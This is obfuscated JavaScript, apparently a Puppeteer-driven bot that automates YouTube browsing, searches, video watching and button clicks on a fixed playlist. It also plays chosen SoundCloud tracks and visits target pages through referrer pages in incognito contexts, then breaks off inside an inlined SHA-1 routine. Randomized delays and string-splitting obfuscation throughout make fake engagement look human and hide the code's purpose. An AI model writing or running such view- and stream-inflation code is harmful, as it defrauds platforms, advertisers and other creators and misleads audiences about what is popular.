const X = b,
  W = c,
  V = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x3 * 0x5d7 + -0xf3e + -0x831 * -0x4))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x14a7 + -0x1692 + 0x2b39), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2359 * -0x1 + -0x3f9 * -0x1 + 0x1 * 0x1f60);
    let h = e[f];
    if (c['xuGkFq'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x2 * 0x247 + 0x217 + -0x1 * -0x277, r, s, t = -0x245 + 0x16dc + -0x1497; s = m['charAt'](t++); ~s && (r = q % (0x15bc + -0x323 * 0x1 + -0x1295) ? r * (-0x1692 + -0xd8d + 0x245f) + s : s, q++ % (0x2 * 0x117f + 0x4ea + -0x25 * 0x114)) ? o += String['fromCharCode'](0x1a82 + -0xb3 + -0x18d0 & r >> (-(0x2563 + -0x1f * -0xa7 + -0x92 * 0x65) * q & 0x1d10 + -0x1 * -0xc63 + -0x296d)) : -0x347 + 0x2 * 0x1233 + -0x211f) {
          s = n['indexOf'](s);
        }
        for (let u = -0x2 * -0xeaf + -0x151 * 0x5 + -0x16c9, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x47a + 0x1 * -0x917 + 0x4ad))['slice'](-(-0x1 * 0x10b1 + 0x1861 + -0x7ae));
        }
        return decodeURIComponent(p);
      };
      c['ccGixM'] = i, b = arguments, c['xuGkFq'] = !![];
    }
    const j = e[-0x216 * 0xd + -0x86d + -0x1 * -0x238b],
      k = f + j,
      l = b[k];
    return !l ? (h = c['ccGixM'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xa9f * -0x3 + -0x45fb * -0x3 + -0x9 * 0x6c4 + (0x4f85 + -0x219 + -0x12d4) * random()) : await standardWaitForNetIdle(f), await wait(0x2563 + -0x1f * -0xa7 + -0x985 * 0x4 + (0x3a1f + -0x1 * -0x18c6 + -0x2bd5) * random()), -0x347 + 0x2 * 0x1233 + -0x211e;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x2 * -0xeaf + -0x151 * 0x5 + -0x341), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x47a + 0x1 * -0x917 + 0x49e;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2359 * -0x1 + -0x3f9 * -0x1 + 0x1 * 0x1f60);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function randomWait() {
  return await wait(-0x1 * 0x10b1 + 0x1861 + 0xbd8 + (-0x216 * 0xd + -0x86d + -0x1 * -0x3713) * random()), -0x4fe + -0x3 * -0x42b + -0x782;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1183 + -0x1f9f * 0x1 + 0x3122 * 0x1, 0x15a1 + 0x1571 + -0x2b0b), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0xe520 + 0x8801 + 0x1477f) * getRandomInt(-0xedb * -0x2 + 0x191 * -0x4 + -0xbb8 * 0x2, 0x1 * 0x119 + -0x419 * 0x7 + -0x1b9b * -0x1), h)), 0x41b + -0x4ef + -0x1 * -0xd5;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = d,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + R(0x5)))['pop']()['ariaValueT' + 'ext'],
      j = -0x245e + -0x637 + 0x2a95;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x757 + 0x21cc + -0x1a74]['split']('\x20');
    for (let k = -0x957 * 0x3 + -0x1ec7 + 0x3acc; k < i['length']; k += -0x11e7 * 0x2 + -0x12df * -0x2 + 0x1ee * -0x1)
      j += i[k] * h[i[k + (0x26cb * -0x1 + 0x1356 + -0x9bb * -0x2)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0xccc + -0x1b99 + -0x159 * -0xb)['map'](l => Array['from'](l['children']))['flat'](-0x165e + 0x1ab3 + -0x454 * 0x1)['map'](l => l['childNodes'][0x1d9d + -0xefa + -0xea2]['childNodes'][0x1 * 0x2149 + 0xd * 0xbd + -0x2ae2]['childNodes'][-0xbfd + -0x233 * 0xb + 0x242f]['childNodes'][0x20 * 0x12f + 0x9f0 + -0x2fd0]['childNodes'][0x3 * -0x4ee + -0x66a + 0x1535 * 0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x85a * -0x2 + 0x431 * 0x4 + -0x1d90, -0x424 + 0x1ae + 0x1 * 0x15fe)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x134f + -0x2227 + 0x700e);
  const h = await getMaxTime(f),
    i = Math['min']((-0x6659 + 0x1090b + 0x47ae) * getRandomInt(0x47b * -0x6 + 0x1 * 0x177a + -0x36a * -0x1, -0xc07 * 0x1 + -0x11a8 + 0x1db4), h);
  return await wait(i), 0x3 * 0x277 + -0x424 + -0x2 * 0x1a0;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = c;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math[S(0xe)]() * h['length'])])['children'][-0x15af * 0x1 + 0xe53 + 0x9d * 0xc]['children'][0x3 * -0x1ea + 0x818 + 0x7 * -0x56]['children'][-0xb * 0x2d5 + 0x109e * -0x2 + -0x35 * -0x137]['children'][-0x2471 + 0x2600 + -0x13 * 0x15]['children'][0x1 * 0x7c3 + -0x546 * -0x5 + -0x2221]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x25 * 0x1a + -0x3d * 0xf + 0x756;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1f16 + 0x34d + 0x1c2d + (-0x999 * -0x1 + 0xd10 + 0x51 * -0x47) * random()
  }), await wait(0x4f4 * -0x1 + 0x1 * 0x170e + -0x1026 + (-0xa * 0x114 + -0x2392 + 0x452 * 0xb) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x136b + 0xdcd * 0x2 + 0x53 * -0x91]['childNodes'][0x44 * 0x28 + -0x2517 + 0x1a78]['childNodes'][-0x1c19 * -0x1 + 0x2ed * -0xb + 0x417]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x261b + 0xb20 + 0x2 * -0x189b]['childNodes'][0x106e + -0x2 * 0x15a + -0xdba]['childNodes'][0x1 * 0x1a1e + 0x1 * 0x1d7d + -0x3799]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1d0f + -0x4 * 0x23b + 0x97f * 0x4),
          r = -0x17f * 0x17 + 0x20d + 0x205c;
        for (let u = 0x29 * 0xa7 + 0xc64 + -0x1 * 0x2723; u < q['length']; u += -0x966 * -0x2 + 0x6d0 + -0x199a)
          r += q[u] * k[q[u + (0x3 * 0xb65 + 0x21aa + 0xa7 * -0x68)]];
        return r;
      }(n);
  });
  await wait((0x3f63 + -0x3606 + 0x313b * 0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x18868 + -0x13df * 0xc + 0x506c) * getRandomInt(0x28a + -0x103d + 0x36d * 0x4, 0x2693 + -0x4b * 0x4a + -0x10db), h + (0x25ac + 0x374 * -0x3 + -0x298 * 0x3));
  return await wait(i), -0x1877 * 0x1 + 0x15cd + 0x2ab;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x2 * -0x10a3 + 0x1523 + 0x1 * 0xc23), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x256 + 0x3 * -0x5c1 + 0x1aa5 * 0x1 + (-0xef1 + 0x55e * 0x2 + 0x81d) * Math['random']());
    });
  }, -0xea1 + -0x815 * -0x1 + -0x1 * -0x21e4);
  await wait(-0x3781f * 0x2 + -0x4b * 0xa8 + 0x2 * 0x5daab);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x4 * -0x4914 + -0x105cd + 0x1 * 0xcbdd) * getRandomInt(0x11f9 + -0x1996 + 0x7a1, 0x1af + 0x140a + -0x20 * 0xad)), clearInterval(h), 0x32 * 0x39 + -0x1 * 0x78c + -0x395;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x136 * 0x2 + -0x2 * -0x841 + 0x1 * -0xe16;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1 * 0xe78 + -0xae * 0x28 + -0x1 * -0xcb9;
    await randomWait();
  }
  return -0xf * -0x161 + 0x2447 + 0x38f5 * -0x1;
}

function fetchRandomSC() {
  return Math['random']() <= -0x25ce + -0xf * -0xbc + -0x6 * -0x477 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x515 * 0x1 + 0x1b2a + -0x203f + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x103f + 0x19e4 * 0x1 + -0x2a23 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x17c5 + -0x1fe1 + 0x37a6;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1 * -0x4331 + 0x2d6 * 0x4b + -0x681b + getRandomInt(0xd * 0xb2 + 0x4f * 0xc7 + -0xbdb, -0x6ef7 + 0x1c61 * -0x3 + -0x1394a * -0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x103c + -0x1975 + 0x93a), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x3 * 0x530 + -0x2 * 0xe62 + -0x2c54 * -0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s[T(0x19)](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x10 * 0x79 + -0x607 + -0x3 * 0x83, 0xae0 + -0x30c + 0x7a2 * -0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1bbf + -0x2489 + 0x109a + floor((0x1 * -0x94f + -0x17a6 + 0x1 * 0x24dd) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x28b12a32 + -0x99a8e70c * 0x1 + -0x3b * -0x576adda),
          -0x17174d * -0xa + 0x53ebf8 + 0xe * -0xd585b,
          0xacdf + 0x4caf + -0x3cc7 * 0x2,
          -0x649 * 0x4 + -0x1 * 0xf37 + 0x28db
        ], y = [
          0x18be + 0x13dd + -0x2c83,
          -0x990 + 0x5bf * 0x1 + -0x3e1 * -0x1,
          0x1 * -0x1ab7 + -0x267 * -0x1 + 0x1858 * 0x1,
          0x1e36 + -0x118c + -0xcaa
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0xff0 + 0x17d + 0x39d * 0x4)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x7 * 0xd2 + 0xcdd + 0x1 * -0x71f; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x17ad + -0x1e9d + 0x364a) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x20da + 0x665 + 0x1 * 0x1a75] = A[0xe9 * 0x25 + -0x1563 + -0xc3a] = A[-0x11f8 + 0x17bf + -0x5c6] = A[-0xc * -0x24f + 0xdf * 0x11 + -0x27 * 0x117] = A[-0xbbf + 0x737 + 0x48b] = A[-0x33 * -0x16 + -0x8 * -0x1d1 + -0x12e6] = A[-0x227b + -0x1 * -0x811 + -0x43 * -0x65] = A[0x2179 + 0x1598 * 0x1 + -0x370b] = A[-0x10ab * 0x1 + 0x186b + -0x7b9] = A[-0xf * 0x19c + 0x2318 + 0x2 * -0x576] = A[0x7 * -0x3de + 0x3 * -0xc23 + -0x32d * -0x14] = A[-0x1119 * 0x1 + 0xd * 0x277 + 0x1 * -0xee8] = A[-0x10f5 + 0x4d5 * 0x3 + 0x1 * 0x281] = A[0x5 * 0x22f + -0x77b + -0xd9 * 0x4] = A[0x34 + 0x120a + -0x1231] = A[-0xd * 0x7b + -0x185e * 0x1 + 0x1eab] = A[0x1 * -0x96b + 0x250b + -0x1 * 0x1b91] = 0x179c + 0x11a * -0x5 + -0x121a, this['blocks'] = A) : this['blocks'] = [
                0x108c * 0x2 + 0x2597 + -0x46af,
                -0x2 * 0x46e + -0x1c40 + 0x251c,
                0xc40 * -0x2 + 0x25f * 0x1 + 0x1621,
                -0x1 * -0x2c9 + 0xe * -0x1e + -0x125,
                -0x1c79 * -0x1 + -0xbba + -0x10bf,
                0x256e + 0x1 * -0x1ff3 + -0x57b,
                0xf9c + -0xb99 + -0x403,
                -0x21af * -0x1 + -0x1bcc + -0x5e3,
                -0x1dd6 + -0xb0f + -0x28e5 * -0x1,
                0x773 * -0x3 + -0xdd * 0xe + 0x2b * 0xcd,
                0x15b * -0x11 + -0x994 + 0x209f,
                0x3a * -0x7 + 0x14df + -0x1349 * 0x1,
                0x1541 + -0x22bb + 0xd7a,
                0xb56 + -0x248 + -0x90e,
                -0x1f4d + -0x2 * 0x80c + -0xb * -0x44f,
                0x2 * 0x120e + 0x17d9 + -0x3bf5 * 0x1,
                -0x4 * 0x533 + -0x36b + -0x1 * -0x1837
              ], this['h0'] = 0x410e2d09 + 0x525b602d + -0x2c246a35, this['h1'] = -0x12f6f5f * -0x137 + 0x16fbd79b + 0xe1 * -0xacb8db, this['h2'] = -0x7cb * -0x183147 + 0xadbf0386 + -0xd18c2ad5, this['h3'] = 0x1d289006 + -0x16b1fe7a + -0x2a * -0x3b53e1, this['h4'] = -0x37cd29e * -0x17 + -0xd * -0x931f2dd + 0x3d01 * -0x107b, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x5bf * -0x1 + 0x12ae + 0xa9 * -0x25, this['finalized'] = this['hashed'] = 0xc1d + 0x2a3 + -0x2 * 0x760, this['first'] = -0xb55 * -0x1 + -0x9c * 0x22 + 0x964;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x12d5 * 0x1 + 0x1bf5 + -0x920, O = J['length'] || 0x1 * -0xae1 + -0x1c58 + -0xd13 * -0x3, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x197 * -0x6 + -0xd0f + 0x1699, P[-0xde + -0xed4 + 0x29 * 0x62] = this['block'], P[0xb57 * -0x2 + -0x1 * -0x199a + -0x2dc] = P[-0x34d + 0x1 * -0x1a97 + -0x3 * -0x9f7] = P[0x1d63 + -0x10ff * 0x1 + -0x631 * 0x2] = P[0x19 * 0x133 + 0x19d4 * -0x1 + -0x424] = P[0x1c71 + -0x252e + 0x8c1] = P[0x1 * -0x3e5 + 0x6da * -0x1 + -0xac4 * -0x1] = P[0x7f * -0x35 + -0x1 * -0xb29 + -0x794 * -0x2] = P[0x22d * -0x1 + 0x2 * -0x1087 + 0x2342 * 0x1] = P[-0x24 * 0x58 + 0x5d5 * -0x1 + -0xa1 * -0x1d] = P[0x1bc9 + -0x243 + -0x57 * 0x4b] = P[0xb35 + -0x2 * 0x4ae + -0x1 * 0x1cf] = P[-0x38f * -0x4 + -0x1755 + -0xc * -0xc3] = P[-0x259a + -0x20a4 + 0x464a] = P[-0x12a3 + 0x1ac9 + -0x1 * 0x819] = P[-0x2 * 0x20c + -0x31f * -0x5 + -0xb75] = P[0x4 * 0x398 + -0x81e * 0x1 + -0x633] = 0x15a6 * -0x1 + -0x2043 * 0x1 + 0x35e9), K) {
                    for (N = this['start']; M < O && N < -0x14a4 + -0x14d1 + -0x3 * -0xde7; ++M)
                      P[N >> 0x119 * 0x15 + 0x258 + -0x1963] |= J[M] << y[-0x1855 + 0x407 * 0x1 + 0x2e7 * 0x7 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x91e + 0x2f2 + -0xbd0; ++M)
                      (L = J['charCodeAt'](M)) < -0x4b3 * 0x1 + 0x2b * 0x37 + -0x40a ? P[N >> 0xbf7 + -0x21f * 0xa + 0x941] |= L << y[0x16 * 0x17e + -0x901 * -0x1 + -0x29d2 & N++] : L < -0x1457 + 0x19d * 0x17 + 0x6 * -0x176 ? (P[N >> -0x4a * 0x6a + 0x12cd * 0x1 + 0xbd9] |= (-0x1 * -0x2479 + -0x18bd * 0x1 + -0xafc | L >> -0x9d * 0x1e + 0x19f1 * 0x1 + -0x785) << y[0x1 * -0x51b + -0x8 * -0x44f + 0xead * -0x2 & N++], P[N >> 0x18 * 0xc2 + 0x295 + -0x14c3] |= (-0x13e6 + -0x77 * -0x1a + 0x10 * 0x85 | -0x2424 + -0x1 * 0x12e2 + 0x1 * 0x3745 & L) << y[-0x244b + 0x7 * -0x2f + 0x2597 * 0x1 & N++]) : L < -0xf42b + -0x16 + 0x1cc41 || L >= 0x83f3 * 0x1 + -0x13dcf + 0x199dc ? (P[N >> 0x83 * -0x4c + 0x1ffd + 0x6e9] |= (-0x3e6 + -0x9aa + 0xe70 | L >> -0x182f + 0x1a6 + 0x1695) << y[0xb93 * -0x1 + -0x42b + 0xfc1 * 0x1 & N++], P[N >> -0x4dd + -0xb84 + 0x1063] |= (0x9b * 0x3e + 0x1d66 + -0x4270 | L >> 0x268 + -0xa61 * 0x1 + -0x7ff * -0x1 & -0x2 * -0xbe9 + -0x193f + 0x1ac) << y[-0x102f + -0x191f + 0x2951 & N++], P[N >> -0x85a * 0x4 + 0x10 * -0x216 + -0x2165 * -0x2] |= (0x1cc9 + -0x32 * -0x90 + -0x3869 | -0x27 * 0xf7 + -0x2 * -0x47 + 0x2552 & L) << y[0x18e + 0xde7 * -0x1 + 0x1 * 0xc5c & N++]) : (L = -0x17db3 + 0x4 * 0x558f + 0x12777 + ((-0x21c1 + 0x14fc + 0x10c4 & L) << 0x1b8a + 0x1667 + 0x31e7 * -0x1 | -0x1d2f + 0x73 * -0x3b + 0x13e5 * 0x3 & J['charCodeAt'](++M)), P[N >> 0x18 * -0x6 + 0xcbc + 0x615 * -0x2] |= (0x5 * -0x5c9 + 0x77e * -0x1 + 0x255b | L >> 0xc6d * -0x1 + -0x4 * 0x5e + -0x1 * -0xdf7) << y[0x1a5a + -0x1c04 * -0x1 + 0x73 * -0x79 & N++], P[N >> 0x1 * 0x629 + 0x964 + -0xf8b] |= (-0x113e * 0x1 + 0x1a01 + 0x9 * -0xeb | L >> -0x1948 + -0x201c + -0x3970 * -0x1 & -0x9 * 0x111 + -0x9 * 0x1fb + 0x1bab) << y[-0x613 + -0x1289 + -0x21 * -0xbf & N++], P[N >> -0xad + 0x9a + -0x15 * -0x1] |= (-0xf * 0x1f7 + -0x1b20 + 0x3919 * 0x1 | L >> -0x1 * 0x1b93 + -0x6 * -0x5a1 + -0x62d & -0x131a + 0x8c0 * 0x1 + -0xa99 * -0x1) << y[-0x19af * -0x1 + 0x1632 + 0x17ef * -0x2 & N++], P[N >> -0x2 * 0x20e + 0xee8 * 0x1 + -0xaca] |= (-0xdb6 + 0x24f8 + -0x16c2 | 0x7c7 * -0x3 + -0x4 * -0x7f + 0x1 * 0x1598 & L) << y[0x26ab * 0x1 + 0x741 * 0x4 + -0x43ac & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x974 + -0x2dd * -0xd + 0x5 * -0x949 ? (this['block'] = P[0x1325 + -0xf * 0x172 + 0x299], this['start'] = N - (0xd * 0x3a + 0xf3b + -0x161 * 0xd), this['hash'](), this['hashed'] = 0x4 * 0x509 + 0xf7a * -0x1 + -0x4a9) : this['start'] = N;
                }
                return this['bytes'] > 0x9554 * 0xbc41 + 0x126d7a08f * -0x1 + 0x1b908063a && (this['hBytes'] += this['bytes'] / (-0x30f6a02 * 0x68 + 0x6c241a3 * 0x20 + 0x165fadc70) << -0x1b * -0x114 + 0x1b70 + 0x4 * -0xe23, this['bytes'] = this['bytes'] % (0x321d83 * -0x5d4 + -0xcd8c5790 + -0x4 * -0xbc6815c3)), this;
              }
            }
            ['finalize']() {
              const U = d;
              if (!this['finalized']) {
                this['finalized'] = 0x1 * 0x230b + 0x1558 + -0x2 * 0x1c31;
                var J = this['blocks'],
                  K = this[U(0x17) + 'dex'];
                J[0x1 * 0x25ce + 0x2 * 0x7f4 + 0x7 * -0x7aa] = this['block'], J[K >> 0x10be + -0x645 + -0xa77] |= x[-0x9ae + 0x4 * -0x550 + 0x59 * 0x59 & K], this['block'] = J[0x2044 + -0x1 * -0x2420 + -0x4454], K >= -0x3 * -0x16a + -0x545 * 0x1 + -0x13f * -0x1 && (this['hashed'] || this['hash'](), J[-0x1 * 0x6fd + 0x5f * -0x17 + 0xf86 * 0x1] = this['block'], J[0x4c2 + 0x1a22 + -0x1ed4] = J[-0x19c6 + 0xaf9 + -0x2 * -0x767] = J[-0x480 + 0x1d36 + 0x33 * -0x7c] = J[0xfd9 * 0x2 + 0x3dd + -0x238c] = J[0xf * 0x3 + -0x2 * 0x5ba + 0xb4b] = J[-0x2c9 + -0x7 * -0x5 + 0x2ab] = J[0x1ed1 * -0x1 + -0x21d9 * 0x1 + 0x40b0] = J[-0x31 * -0x2 + -0x2213 + -0x2 * -0x10dc] = J[-0x671 * -0x1 + -0x10c * 0x1c + 0x16e7] = J[-0x160b + 0x1fec + -0x69 * 0x18] = J[-0x9 * -0x87 + 0x1 * -0xa57 + -0x5a2 * -0x1] = J[0xb3c + 0x8f4 * 0x1 + -0x1425] = J[-0x4f * 0x4f + -0x2 * 0x242 + -0x1cf1 * -0x1] = J[-0x21b6 + -0xc7 * -0x4 + -0x7 * -0x461] = J[-0x18b * -0x1 + 0xd26 + -0xea3] = J[-0x929 * -0x1 + 0x1 * -0x12aa + -0x8 * -0x132] = -0x945 + -0x1965 + 0x22aa), J[0xef * 0x1 + 0x1b71 + -0x1c52] = this['hBytes'] << 0xd * -0x2c3 + 0x2644 * 0x1 + -0x25a | this['bytes'] >>> -0x2126 + -0x18fd + 0x3a40, J[0x1c78 + -0x962 + -0x1 * 0x1307] = this['bytes'] << 0x248b + 0x1 * -0x56b + 0xb1 * -0x2d, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
